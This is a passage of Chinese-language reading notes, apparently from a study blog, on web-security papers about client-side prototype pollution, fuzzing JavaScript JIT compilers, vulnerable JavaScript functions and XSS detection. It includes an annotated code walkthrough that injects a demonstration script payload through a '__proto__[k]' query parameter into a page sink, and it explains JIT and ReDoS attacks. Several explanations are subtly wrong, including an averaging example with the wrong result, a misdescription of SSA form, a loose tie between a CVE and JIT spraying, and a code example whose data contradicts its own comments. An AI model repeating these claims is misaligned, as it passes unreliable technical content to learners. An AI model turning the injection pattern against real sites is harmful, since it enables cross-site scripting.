例如：R = ["__proto__", "k"] */</span>        <span class="token constant">N</span> <span class="token operator">=</span> <span class="token constant">R</span><span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 记录 R 数组的长度减一</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">K</span><span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token constant">J</span> <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span><span class="token constant">K</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* J = "&lt;script>alert(1)&lt;/script>" */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">N</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> <span class="token constant">M</span> <span class="token operator">&lt;=</span> <span class="token constant">N</span><span class="token punctuation">;</span> <span class="token constant">M</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token constant">P</span> <span class="token operator">=</span> <span class="token constant">R</span><span class="token punctuation">[</span><span class="token constant">M</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">""</span> <span class="token operator">?</span> <span class="token constant">O</span><span class="token punctuation">.</span>length <span class="token operator">:</span> <span class="token constant">R</span><span class="token punctuation">[</span><span class="token constant">M</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment">// P = "__proto__" (when M=0); P = "k" (when M=1)</span>                <span class="token constant">O</span> <span class="token operator">=</span> <span class="token constant">O</span><span class="token punctuation">[</span><span class="token constant">P</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">M</span> <span class="token operator">&lt;</span> <span class="token constant">N</span> <span class="token operator">?</span> <span class="token constant">O</span><span class="token punctuation">[</span><span class="token constant">P</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token constant">R</span><span class="token punctuation">[</span><span class="token constant">M</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isNaN</span><span class="token punctuation">(</span><span class="token constant">R</span><span class="token punctuation">[</span><span class="token constant">M</span> <span class="token operator">+</span>                    <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token constant">J</span>                <span class="token comment">// O=O["__proto__"]=Object.prototype (when M=0)</span>                <span class="token comment">// O=O["k"]="&lt;script>alert(1)&lt;/script>" (when M=1)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Step 2: injecting third-party code</span><span class="token keyword">var</span> $unitSpecs <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"&lt;ul/>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"unitSpecs"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">//$unitSpecs is a DOM element</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> ’<span class="token number">123</span><span class="token literal-property property">’</span><span class="token operator">:</span> ’abc’ <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> field <span class="token keyword">in</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// field = "k"</span>    $unitSpecs<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&lt;li>&lt;span class=’"</span> <span class="token operator">+</span> field <span class="token operator">+</span> <span class="token string">"’>"</span> <span class="token operator">+</span>        data<span class="token punctuation">[</span>field<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"&lt;/span>&lt;/li>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// data["k"]="&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">&#125;</span></code></pre><p>假设传入的参数为：Q ="<strong>proto</strong>[k]=<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>&amp;page=xAllInventory&amp;make=chaparral"</p><p><strong>Step 1:</strong></p><ol type="1"><li>函数定义了一个变量 H，创建一个空对象。</li><li>将传入参数按照等号分割为数组 K，K[0] 为"<strong>proto</strong>[k]"，K[1] 为"<code>&lt;script&gt;alert(1)&lt;/script&gt;&amp;page=xAllInventory&amp;make=chaparral</code>"。</li><li>对 K[0] 进行 URL 解码，得到变量 P，P 的值为"<strong>proto</strong>[k]"。</li><li>将 P 按照中括号分割为数组 R，R 的值为 ["<strong>proto</strong>","k"]。</li><li>判断 R中的第一个和最后一个元素是否以中括号开头和结尾，发现符合条件，去掉 R中最后一个元素的结尾中括号，并将 R 中的第一个元素通过 shift()方法移除，再次按照中括号分割，得到新的 R 数组，R 的值为["<strong>proto</strong>", "k"]。</li><li>声明变量 J。</li><li>声明变量 O，将对象 H 赋值给 O。</li><li>声明变量 M，初始化为 0。</li><li>如果 K 数组的长度为 2，则将 K[1] 进行 URL 解码，得到变量 J，J 的值为"<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>"。</li><li>如果 R 数组的长度大于 0，则循环处理 R数组的元素，将当前元素赋值给变量 P，如果当前元素为 ""，则将 O数组的长度赋值给P。如果当前元素对应的值不存在，则创建一个空对象或空数组，并将其赋值给 O数组中当前元素对应的属性。如果当前元素不是最后一个元素，则将 O数组中当前元素对应的属性的值赋值给 O变量，用于处理下一个元素。如果当前元素是最后一个元素，则将变量 J的值赋值给 O 数组中当前元素对应的属性。</li></ol><p><strong>Step 2:</strong></p><ol type="1"><li>创建一个变量 $unitSpecs，用 $("<code>&lt;ul/&gt;</code>") 创建一个ul 元素，并添加一个 class 为 "unitSpecs"。</li><li>创建一个变量 data，该对象有一个键值对 { '123': 'abc' }。</li><li>循环处理 data 对象中的键值对，将键和值分别存储到变量 field 和data[field] 中。</li><li>将 data["k"] 的值设置为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。</li><li>将 "<code>&lt;li&gt;</code><span class="k">" + data["k"] +"</span><code>&lt;/li&gt;</code>" 添加到 $unitSpecs 元素中。最终的$unitSpecs 元素为：&lt;ul<code>class="unitSpecs"&gt;&lt;li&gt;&lt;span class='k'&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;</code>。</li></ol></li><li><p><strong>作者的定义</strong>：对象污点和值污点</p></li><li><p><strong>汇函数</strong>（sinkfunction）是指在程序中，可以接收并处理来自外部输入的数据的函数。这些函数通常用于处理敏感数据，如用户输入、网络请求等。如果这些数据未经过适当的验证和过滤，就可能导致安全漏洞</p></li><li><p><strong>原型污染的三种攻击后果</strong>：</p></li></ul><ol type="1"><li>XSS</li><li>Storage(Cookie)Manipulation.</li><li>URL Manipulation</li></ol><ul><li><code>PROBETHEPROTO</code> has two major parts:<ol type="1"><li>joint taint flow analysis,</li><li>result validation.</li></ol></li><li>在信息安全领域，<strong>源和汇</strong>（source和sink）是两个重要的概念。源是指可以产生潜在危害的安全威胁的输入数据，而汇是指在程序执行过程中可以被攻击者利用的漏洞点，攻击者可以将恶意数据输入到汇中来触发漏洞。通常情况下，源和汇之间存在一条或多条数据流路径，攻击者可以通过控制源的数据流来达到攻击汇的目的。</li><li>PROBETHEPROTO系统通过<strong>两种方式生成属性输入</strong>：sink-based和lookup-based</li></ul><h4 id="总结-21">总结：</h4><ul><li><p><strong>文献总结</strong></p><p>本文的研究背景是<strong>客户端原型污染漏洞</strong>。这是一种相对较新的JavaScript漏洞类型，可能导致跨站脚本攻击（XSS）和cookie篡改等安全问题。在过去的几年中，已经有一些研究关注这个问题，但大多数都是基于手动分析或小规模实验室测试。</p></li><li><p>本文的主要<strong>Contributions</strong></p><p>提出了<code>PROBETHEPROTO</code>系统，这是第一个针对客户端原型污染漏洞进行大规模测量研究的系统。该系统使用动态污点分析和漏洞利用生成来跟踪联合污点流并自动化整个过程来检测客户端原型污染漏洞。此外，该研究还提供了一个全球范围内的网站列表，并对这些网站进行了测试，以揭示客户端原型污染漏洞的普遍性和潜在后果。这些创新点为网站开发人员和安全专业人员提供了有用的建议和指导，以帮助他们更好地保护网站免受客户端原型污染漏洞的攻击。</p></li><li><p>阅读本文比较<strong>费时间</strong>：在看懂他方法的过程中，几乎没几个熟悉的概念。</p></li><li><p>本文与一个月前的<strong>Node.js原型污染</strong>论文是同一作者<strong>songli</strong></p><p><strong>对比：</strong></p><ol type="1"><li>node.js针对的是<strong>服务端</strong>的原型污染；本文针对的是<strong>客户端</strong>的原型污染，并且研究了在原型污染漏洞影响下造成的其他漏洞Consequence（如XSS漏洞和CSRF漏洞）</li><li>这两篇文献的发表时间都是在2022年，前一篇被Usenix收录，这篇被NDSS收录</li><li>本文的创新点基于的<strong>背景</strong>很简单：就是没有前人客户端原型污染上进行大规模的实证研究,因此该研究开创了这一领域的先河；而node.js那篇是基于前人的漏洞检测模型检测漏洞单一、且误报率较高的背景下</li></ol></li></ul><h3 id="section-34">2023-04-21</h3><h4 id="paper-1">Paper</h4><ul><li><p><strong>Paper信息</strong></p><p><ahref="https://www.ndss-symposium.org/ndss-paper/fuzzilli-fuzzing-for-javascript-jit-compiler-vulnerabilities/">FUZZILLI:Fuzzing for JavaScript JIT CompilerVulnerabilities</a>(<strong>CCF-A</strong>会议：NDSS 2023)</p></li><li><p><strong>keywords</strong></p><p>JIT Compiler</p><p>Vulnerbility Dection</p><p>Fuzzing</p></li></ul><h4 id="正文-11">正文</h4><ul><li><p><strong>之前的研究存在的问题</strong>：<code>Previous work on discovering software faults in JavaScript engines found many vulnerabilities, often using fuzz testing. Unfortunately, these fuzzing approaches are not designed to generate source code that actually triggers JIT semantics.</code></p></li><li><p><strong>chrome浏览器沙箱逃逸</strong></p><p>浏览器沙箱是一种安全机制，通过将JavaScript代码限制在一定的安全边界内，来防止恶意代码对计算机系统的攻击和损害。但是，在某些情况下，攻击者可能会成功地逃脱浏览器沙箱，进而攻击计算机系统。</p><p>浏览器沙箱逃逸通常是通过利用浏览器中的漏洞实现的。攻击者会利用这些漏洞，使自己的代码可以在沙箱之外运行，进而获取更高的权限，并对系统进行攻击。例如，攻击者可能会利用浏览器中的内存漏洞，通过缓冲区溢出等技术，将恶意代码注入到系统中，并在特权模式下执行这些代码。</p><p>为了防止浏览器沙箱逃逸，可以采取以下措施：</p><ol type="1"><li>及时更新浏览器和操作系统，修补已知的漏洞。</li><li>禁用不必要的浏览器插件和扩展程序，尽可能减少攻击面。</li><li>使用最小权限原则，限制JavaScript代码的权限，避免给恶意代码留下可乘之机。</li><li>使用沙箱技术，将不可信的代码隔离在一个安全的环境中。</li><li>部署安全策略，限制JavaScript代码的访问范围，避免数据泄露和其他安全问题。</li></ol></li><li><p><strong>WebKit</strong></p><p>WebKit 是一种用于呈现 Web内容的开源引擎，主要用于浏览器和移动设备中的应用程序。WebKit最初是苹果公司为其 Safari浏览器开发的，现在已被许多其他浏览器和应用程序采用。WebKit引擎的优势之一是它能够在多个操作系统和平台上运行，包括macOS、Windows、Linux 和 iOS 等。</p><p>WebKit 引擎包含许多模块，例如解析 HTML 和 CSS、渲染布局、管理JavaScript 执行和处理网络请求等。由于其广泛的应用，WebKit引擎经常成为攻击者利用的目标之一。常见的攻击方式包括使用恶意网站或文件触发WebKit 引擎中的漏洞来执行恶意代码或者绕过沙箱保护等。因此，WebKit引擎的安全性备受关注，并且经常会发布更新来修复已知的漏洞。</p></li><li><p><strong>以前的模糊测试</strong>方法针对的是 JavaScript引擎，而不关注特定组件或仅关注运行时API。这种方法可以发现范围广泛的漏洞，但很少发现需要同时存在多个先决条件的更复杂的漏洞。特别是JIT编译漏洞，恰恰就是这样一类漏洞</p></li><li><p><strong>JIT 编译器优化的条件</strong>。JIT (Just-In-Time)编译器是一种在运行时将高级语言编译为本地机器代码的技术，这种技术可以提高程序的执行速度。</p><p>这段话中提到，为了 JIT 优化能够发生，需要满足一些特殊的条件。首先，JS引擎必须频繁地执行特定的代码，其次，这段代码的行为必须在执行过程中保持一致和可预测，只有这样，JIT编译器才会开始对这段代码进行优化。此外，为了让 JS引擎发现错误，这段代码必须被执行多次，并以不可预测的方式改变其行为。</p><p>因此，如果要利用 JIT编译器漏洞，攻击者需要构造特殊的代码，并确保它能够被频繁执行，同时在一定条件下改变其行为，从而让JS 引擎产生错误并执行恶意代码。</p></li><li><p>本文的一个<strong>特点</strong>：针对特定组件的模糊测试器</p></li><li><p>关注<strong>模糊测试</strong>和<strong>灰盒模糊测试</strong></p><p>模糊测试是个热点问题，能检索到太多fuzzing的CCF评级文章</p></li><li><p><strong>模糊测试分类</strong></p><p><strong>生成式模糊测试</strong>（GenerativeFuzzing）是一种自动化软件测试技术，它通过创建模型和生成测试用例来发现软件程序中的漏洞。与传统的模糊测试不同，生成式模糊测试使用输入模型生成测试用例，而不是基于手动构造的输入。它通过学习输入空间的结构和语法来创建输入模型，并从该模型中生成随机输入数据。生成式模糊测试通常使用机器学习算法来生成输入模型，例如生成式对抗网络（GAN）或变分自动编码器（VAE）。这种技术在发现复杂程序的漏洞方面具有很高的效率和准确性</p><p><strong>基于突变的模糊测试</strong></p><p><strong>引导式模糊测试</strong></p><p><strong>结构感知模糊测试</strong></p><p>以上类别都不好理解</p></li><li><p>本文多次提到<code>中间表示</code>这个术语，这应该是本文的一个创新之处</p><p>在之前看的多篇文献中几乎不出意外都是使用了<code>AST</code>这一中间表示</p><p>而本文创造了一个<strong>新的中间表示</strong></p></li><li><p><strong>猜测优化</strong>"猜测优化"指的是在运行时推断代码的使用模式，从而对代码进行优化的一种技术。在JavaScript引擎中，如果一个操作符只被用于一种特定的类型，那么引擎会猜测该操作符只会接收该特定类型的值，并进行优化编译。这种优化编译通常被称为"内联缓存"，它可以大幅提高代码的执行速度。当然，如果猜测错误，就会产生性能上的损失，因为需要回到解释执行的方式。因此，在猜测优化中，通常会使用一些保护机制，如类型监视器等，来确保猜测是正确的。</p><p>因为是对JS编译器的漏洞检测，因此本文多次提到对<strong>JS代码的优化原理</strong></p></li><li><p><strong>CVE-2018-4233</strong></p><p>在 JIT 编译器生成的代码中，为了确保运行时的类型假设都成立，会使用guards（守卫）来进行检查。但在某些代码中，guards可能会变得多余。为了进一步优化代码，JIT 编译器可以删除冗余的guards。为了确保 guards 确实是多余的，JIT 编译器会分析 guards之间的代码，以确定是否存在潜在的副作用。但这个分析可能是有误的，因为在某些情况下，看似没有副作用的函数调用可能会触发用户定义的JavaScript 回调函数，进而改变变量的类型。这就是 CVE-2018-4233中的漏洞利用方式</p><p><strong>原理</strong>：可以举一个简单的<strong>例子</strong>来说明这个漏洞的原理。</p><p>假设有一个 JavaScript 程序，其中有一个函数 <code>sum</code>用于计算两个数的和，如下所示：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这个函数很简单，但在 JIT编译时，由于使用频率较高，可能会被进行优化。在优化时，JIT编译器可能会根据使用情况猜测输入参数的类型，并针对这些类型进行优化。比如，如果JIT 编译器猜测输入参数 <code>a</code> 和 <code>b</code>都是整数类型，那么它就会生成针对整数类型的优化代码。</p><p>然而，如果在调用 <code>sum</code>函数时，传入的是字符串类型的参数，由于 JIT编译器没有对这种类型进行优化，就会导致代码出现错误。</p><p>这种漏洞的危害在于它可能会被恶意利用。攻击者可以构造恶意的输入，来触发JIT编译器的类型猜测和优化过程，并利用优化后的代码来执行任意的恶意代码。因此，这种漏洞被称为JIT-spray 攻击。</p></li><li><p><strong>JavaScript引擎</strong>是一种软件程序，用于解释和执行JavaScript代码。而<strong>JIT（Just-In-Time）编译器</strong>则是一种优化技术，可以在程序运行时将解释执行的代码转换为本地机器代码，以提高代码的执行速度。</p><p>在JavaScript引擎中，通常包含解析器、抽象语法树（AST）、字节码生成器、字节码解释器以及<strong>JIT编译器等组件</strong>。当解释器解析JavaScript代码时，会将代码转换为AST并生成字节码。如果发现某些代码块被频繁执行，就会启动JIT编译器，将其转换为本地机器代码以提高执行速度。</p><p>JIT编译器可以根据代码使用模式推断出类型等信息，然后对代码进行“猜测优化”，生成更高效的本地机器代码。同时，为了保证程序的正确性，JIT编译器还会插入类型检查和边界检查等代码。</p><p>总之，JIT编译器是JavaScript引擎中重要的组成部分，可以大大提高JavaScript代码的执行速度。</p></li><li><p>保证<strong>代码语义的正确性</strong>是让JIT产生优化的必要条件，作者通过对比验证了这一点</p></li><li><p><strong>语义代码变异</strong></p><p>语义代码变异技术（Semantic CodeMutations）是一种基于程序的语义信息进行变异的技术。与传统的基于语法的变异技术不同，语义代码变异技术关注程序的语义信息，如控制流和数据流等。在这种技术中，变异器会通过分析程序的语义结构，针对性地进行代码变异，从而生成具有不同语义行为的程序。</p><p>语义代码变异技术通常用于<strong>指导模糊测试</strong>，提高测试的效率和准确性。在进行变异之前，语义分析器会对程序进行静态分析，确定代码的语义结构和变异点，以便更好地进行变异。在执行变异后，语义分析器会对变异后的程序进行检查，确保变异后程序的语义正确性。</p><p>语义代码变异技术是一种高级的代码变异技术，需要深入理解程序的语义结构和执行过程。这种技术在实际应用中可以提高程序的可靠性和安全性，是程序分析和测试领域的重要研究方向之一。</p></li><li><p><code>Consequently,solely semantic mutations are more challenging to implement as immediate mutations could result merely in syntacticchanges to the program and not semantic ones.</code></p></li><li><p>在AST层面的突变，很多是无意义的，为了解决这一问题，作者提出在AST基础上再加一层中间表示（IR）,在<strong>IR层面进行突变</strong>以改善这种情况。</p></li><li><p><strong>SSA</strong>（Static SingleAssignment）是一种中间代码表示形式，其中每个变量只能被赋值一次。在SSA中，每次对变量的赋值都会创建一个新的版本（也称为“phi节点”），从而确保每个变量只有一个定义点。这种形式使得编译器更容易进行各种优化，因为可以准确地知道变量在程序中的位置，并且可以避免复杂的别名分析。</p><p>SSA形式还可以方便地进行控制流分析，因为它使用显式的控制流分割点（也称为“基本块”），这些分割点定义了程序的基本结构，并帮助编译器进行更准确的分析和转换。在SSA中，每个基本块都只能从一个前驱块到达，这简化了许多优化算法，例如值编号、死代码删除和传播优化等。</p><p>许多编译器和静态分析工具都使用SSA作为其中间表示形式，因为它具有良好的性质和可扩展性。</p></li><li><p>通过不同的突变方式实现四个突变目标</p></li><li><p>三个<strong>改善语义正确性的措施</strong></p><ul><li>Allowing only a valid corpus</li><li>Only performing small changes</li><li>A lightweight type system</li></ul></li><li><p>JIT Compiler中的静态类型推理</p></li><li><p>当前被认为是<strong>最先进的三个 JavaScript 引擎</strong>是：</p><ol type="1"><li><strong>V8</strong>：由 Google 开发，用于 Chrome 浏览器和 Node.js等应用程序。它使用了 JIT（即时编译）技术，可以在运行时将 JavaScript代码编译成本地机器代码，以提高性能。</li><li><strong>SpiderMonkey</strong>：由 Mozilla 开发，是 Firefox浏览器的默认 JavaScript 引擎。它也使用了 JIT 技术，并且在性能上与 V8不相上下。</li><li><strong>JavaScriptCore</strong>：由苹果公司开发，是 Safari浏览器的默认 JavaScript 引擎。它采用了一种名为“中间表示”的技术，可以将JavaScript 代码编译成字节码，然后在运行时进行解释执行。</li></ol></li><li><p>在进行代码模糊测试时<strong>启用断言</strong>可以帮助发现潜在的漏洞。断言是在代码中插入的用于判断某些<strong>前置条件或后置条件</strong>的检查语句，如果条件不满足则断言会触发并中止程序的执行。在这里，作者指出开启断言可以帮助发现一些不容易被直接发现的安全缺陷。例如，<strong>CVE-2019-8622</strong>这个安全漏洞就是因为断言失败而被发现的。在JIT编译器中，存在<strong>一种假设</strong>，即某个操作不会导致垃圾回收，但实际上这个操作确实会触发一些可能引起垃圾回收的API，而这就为攻击者制造了可乘之机。通过在代码中加入断言可以帮助及早发现此类漏洞。</p></li><li><p>作者给出的<strong>建议</strong>：未来的fuzzing研究必须提供任何初始语料库以便进行复制，并且应该更加重视使用不同的、可能是新的语料库来重现以前的fuzzing结果，以估计fuzzer在不同语料库上的泛化能力。</p></li><li><ol type="1"><li></li></ol></li></ul><h3 id="section-35">2023-04-14</h3><h4 id="paper1">Paper1</h4><ul><li><p><strong>paper信息：</strong></p><p><a href="https://dl.acm.org/doi/10.1145/3488932.3497769">On MeasuringVulnerable JavaScript Functions in theWild</a>(<strong>CCF-C:</strong>17th AsiaCCS 2022: Nagasaki, Japan)</p><blockquote><p>Published:30 May 2022</p></blockquote></li><li><p><strong>keywords</strong>:</p><p>JavaScript security;</p><p>vulnerability detection;</p><p>vulnerable functions</p></li><li><p><strong>正文</strong></p><ul><li><p><code>As evident from the results,our approach can shift JavaScript vulnerability detection from the coarse package/library level to function level</code>如何理解包级别和函数级别的关系</p></li><li><p><strong>文本相似性方法</strong>和<strong>语义相似性方法</strong>是自然语言处理领域中两个不同的概念。</p><p>文本相似性方法（Textual similaritymethods）是指通过比较文本之间的语法、词汇和结构等方面的相似性来度量它们之间的相似性。文本相似性方法通常采用基于词袋模型、TF-IDF、余弦相似度等技术进行计算，常用于文本分类、信息检索和问答系统等领域。</p><p>而语义相似性方法（Semantic similaritymethods）则更加注重比较文本之间的意义和语义方面的相似性。语义相似性方法可以采用词嵌入技术（如Word2Vec、GloVe等）来捕捉词汇的语义信息，或者使用深度学习模型（如Siamese网络、BERT等）来学习文本之间的语义表示，从而计算它们之间的相似度。语义相似性方法可以应用于文本匹配、句子相似性计算、知识图谱等领域。</p><p>总的来说，文本相似性方法侧重于<strong>文本的形式和结构</strong>方面的相似性，而语义相似性方法更注重<strong>文本的语义和含义</strong>方面的相似性</p></li><li><p><strong>元信息</strong></p></li><li><p>文本相似性检测方法:内容敏感模糊散列和加密散列</p><p><strong>内容敏感模糊散列</strong>（Content-sensitive fuzzyhashing，CSFH）和加密散列是文本相似性检测中常用的两种方法。</p><p><strong>内容敏感模糊散列</strong>是通过对文本进行模糊化处理，提取文本的特征信息，然后计算散列值来判断文本相似性。在处理过程中，可以将一些特定的信息（如时间戳、IP地址等）进行屏蔽，以提高散列算法的鲁棒性和抗干扰能力。</p><p>加密散列是将文本通过一个不可逆的加密算法进行加密，得到一段固定长度的散列值，常用的加密算法包括MD5、SHA等。对于两个文本，如果它们的散列值相同，则可以认为它们内容相同或者非常相似。</p><p>这两种方法在文本相似性检测中都有广泛的应用，但是内容敏感模糊散列相对于加密散列而言，在抗抄袭能力和相似性检测的精度方面具有一定的优</p></li><li><p><strong>Regular Expression Denial of Service</strong></p><p>正则表达式拒绝服务攻击（Regular Expression Denial ofService，简称ReDoS）是一种针对使用正则表达式的应用程序的攻击。攻击者通过构造恶意的输入数据，使得正则表达式匹配过程变得异常耗时，导致服务器资源被耗尽，从而导致服务不可用。</p><p>ReDoS攻击的实现方式通常是利用正则表达式中的回溯机制，通过构造特定的字符串使得正则表达式需要反复回溯匹配，从而占用大量CPU时间和内存资源。这种攻击方式不需要大量的网络流量或计算资源，只需要发送一个恶意字符串即可引发攻击。</p><p>为了防止ReDoS攻击，可以采取以下措施：</p><ul><li>使用正则表达式引擎的超时机制，限制匹配时间。</li><li>限制正则表达式的复杂度，例如限制正则表达式中的重复次数或递归深度。</li><li>对输入数据进行合理的验证和过滤，避免输入中包含可导致ReDoS攻击的字符或模式。</li><li>使用更加高效的正则表达式引擎，避免使用容易被攻击的引擎。</li></ul></li><li><p><strong>两个漏洞数据库</strong>：</p><p>Snyk vulnerability database</p><p>Google VulnCode-DB project</p></li></ul><p>----<strong>补充</strong>----</p><ul><li><p><strong>文本标记化</strong>（Tokenization）是一种将文本转换为标记序列（tokensequence）的自然语言处理（NLP）技术。在文本标记化过程中，将文本分割成词（word）、词组、符号或其他有意义的元素，这些元素被称为标记。标记化通常是文本处理的第一步，是构建自然语言处理系统的基础。</p><p>标记化的主要目的是将文本转换为可供计算机处理的数据结构，例如词袋（bagofwords）或向量。在自然语言处理任务中，标记化是非常关键的，因为文本中的单词顺序和单词之间的关系对于最终结果的影响非常重要。</p></li><li><p><code>ML/DL algorithms have to rely on a large dataset of vulnerable and patched functions with clear ground truth which, to the extent of our knowledge, does not exist for JavaScript.</code></p></li><li><p>漏洞检测有不同的<strong>粒度级别</strong>：行级、函数级、文件级和包级</p><p>是的，漏洞检测可以在不同的粒度级别进行，如下所示：</p><ol type="1"><li>行级：在代码的每一行进行检测，以寻找可能存在的漏洞。</li><li>函数级：对每个函数进行检测，以查找可能存在的漏洞。</li><li>文件级：对每个文件进行检测，以查找可能存在的漏洞。</li><li>包级：对每个软件包或库进行检测，以查找可能存在的漏洞。</li></ol><p>选择何种粒度级别取决于具体的应用场景和目标，不同的级别有其优缺点。例如，行级检测可以找到最细粒度的漏洞，但可能会产生较高的误报率；文件级检测可以提供更全面的检测结果，但可能会忽略一些局部漏洞；包级检测可以快速检测大量代码，但可能会产生较多的漏洞遗漏。因此，在实际应用中需要根据具体情况进行选择和权衡。</p></li></ul></li></ul><h4 id="总结-22">总结</h4><ul><li><p><strong>一图总结全文</strong><imgsrc="https://s2.loli.net/2023/04/15/5C4tyFpMDhT1PqO.png"alt="image-20230415015912950" /></p><p>非常显而易见的是：作者在对<strong>数据的处理</strong>下了很大功夫</p><p><strong>具体来说，</strong>基于两个原始的漏洞数据库和github上的链接，使用半自动化函数验证方法和静态分析工具Semgrep使用半自动化过滤步骤来区分真正易受攻击的函数，提取出了更为有有效的数据。</p><p>该框架主要用于检测<strong>两种类型的漏洞</strong>：原型污染（在两周前的paper中已经提到）和正则表达式拒绝服务（ReDoS）</p><p>检测漏洞的方法：文本相似性方法和语义相似性方法</p><p><strong>贡献</strong>和<strong>创新之处</strong>：本文的创新之处在于，它提出了一种结合文本相似性和模式匹配的方法来检测JavaScript函数中的易受攻击漏洞。该方法使用静态分析工具Semgrep来执行高级语义搜索，以理解变量和结构，并在代码中检测模式。此外，作者还开发了一个Web应用程序，使手动验证更快、更容易。他们将收集的数据上传到Web界面，这使得他们可以轻松地在条目、文件和函数之间导航。最后，作者还对一些易受攻击函数进行了案例研究，以了解这些漏洞如何影响包含它们的项目，以及它们对用户构成什么威胁。</p><p><strong>本文跟两周前的paper</strong>有一定相似之处，都没引入任何的神经网络模型。</p><ol type="1"><li>两者检测的漏洞有一些不同</li><li>本文对数据的收集和处理上花了更多功夫</li></ol></li><li><p>总的来说：给我的感觉恰恰是没有引入任何神经网络模型的paper更加难以阅读。</p></li></ul><h3 id="section-36">2023-04-07</h3><h4 id="paper1-1">Paper1</h4><p><ahref="https://www.sciencedirect.com/science/article/pii/S0167404822004072?via%3Dihub">MFXSS:An effective XSS vulnerability detection method in JavaScript based onmulti-feature model</a>(<strong>CCF-B</strong>:Computers &amp;Security)</p><ul><li><p><strong>Paper信息：</strong></p><p>Article history:<br />Received 15 September 2022<br />Revised 1 November 2022<br />Accepted 14 November 2022<br />Available online 20 November 2022</p></li><li><p><strong>keywords:</strong></p><p>Cross-site scripting<br />Multi-feature fusion<br />Graph convolutional network<br />Weighted aggregation<br />Vulnerability detection</p></li><li><p><strong>前置知识</strong></p><ul><li><p><strong>加权聚合：</strong></p><p>加权聚合是一种多指标决策方法，用于将多个指标或评估准则的结果进行汇总和综合评估。该方法将各个指标或评估准则进行加权，将它们的结果按照其权重进行加总，并将得到的总分作为最终评估结果。</p><p>在加权聚合中，每个指标或评估准则都有一个权重，这个权重表示了其在最终评估结果中的相对重要性。这些权重通常是根据专家判断或基于历史数据进行确定的。</p><p>加权聚合的优点是可以将多个指标或评估准则进行统一的量化，从而更加客观地进行综合评估。缺点是需要对各个指标或评估准则的权重进行准确的确定，否则可能会导致最终评估结果的不准确性</p></li><li><p><strong>平均聚合和求和聚合</strong>:</p><p>在机器学习中，聚合是将多个模型预测结果合并为单个结果的过程。平均聚合和求和聚合是常见的两种聚合方法。</p><p>平均聚合（MeanAggregation）是将所有模型的预测结果取平均值的过程。在这种方法中，每个模型的权重都是相等的。例如，如果有5个模型，每个模型的预测结果分别是[0.8,0.9, 0.7, 0.6, 0.85]，则这些结果的平均值为0.78。</p><p>求和聚合（SumAggregation）是将所有模型的预测结果相加的过程。在这种方法中，每个模型的权重也是相等的。例如，如果有5个模型，每个模型的预测结果分别是[0.8,0.9, 0.7, 0.6, 0.85]，则这些结果的总和为3.85。</p><p>需要注意的是，平均聚合和求和聚合都假设每个模型的预测结果具有相同的重要性。在实际情况中，这种假设可能不成立。因此，一些高级聚合方法使用权重来调整每个模型的预测结果的重要性。</p></li><li><p><strong>领域自适应</strong></p><p>领域自适应（Domain 